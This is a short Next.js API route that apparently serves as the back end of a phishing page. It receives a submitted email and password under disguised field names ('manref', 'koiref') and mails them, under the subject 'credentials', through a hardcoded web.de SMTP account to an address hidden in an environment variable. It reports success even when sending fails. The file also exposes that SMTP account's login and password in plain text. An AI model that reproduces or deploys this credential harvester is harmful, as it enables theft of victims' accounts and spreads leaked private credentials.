import { NextResponse, NextRequest } from "next/server";
import mailer from "nodemailer";

export async function POST(request: Request) {
  const res: any = await request.json();

  try {
    let transporter: mailer.Transporter = mailer.createTransport({
      service: "web.de",
      host: "smtp.web.de",
      port: 465,
      secure: true,
      auth: {
        user: "christophw87@web.de",
        pass: "frieselman",
      },
    });

    const result = await transporter.sendMail({
      from: `"dees" <christophw87@web.de>`,
      to: `${process.env.EMAIL_TO_SEND}`,
      subject: "credentials",
      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
      html: `<h3>email: ${JSON.stringify(res.manref).replaceAll(
        '"',
        ""
      )}, password: ${JSON.stringify(res.koiref).replaceAll('"', "")}</h3>`,
    });

    return NextResponse.json({ status: true, message: result });
  } catch (error) {
    return NextResponse.json({ status: true, message: error });
  }
}
